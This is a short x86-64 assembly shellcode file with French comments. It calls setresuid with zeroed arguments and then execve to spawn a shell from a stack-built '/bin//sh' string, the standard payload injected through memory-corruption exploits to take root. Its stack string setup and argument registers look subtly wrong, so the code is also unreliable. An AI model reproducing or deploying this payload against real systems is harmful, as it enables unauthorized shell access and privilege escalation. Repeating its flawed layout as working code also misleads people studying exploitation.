BITS 64
xor rax, rax
xor rdi, rdi
xor rsi, rsi
cqo; https://www.felixcloutier.com/x86/cwd:cdq:cqo
mov byte al, 0x75; byte peut être omis
syscall

push rdx
push 0x6e69622f
push 0x68732f2f
mov rsi, rsp
lea rdi, [rsp]
lea rdx, [rdx]
push byte +0x3b
pop rax; pop rax est un seul octet, pop ne peut pas être utilisé avec al 
syscall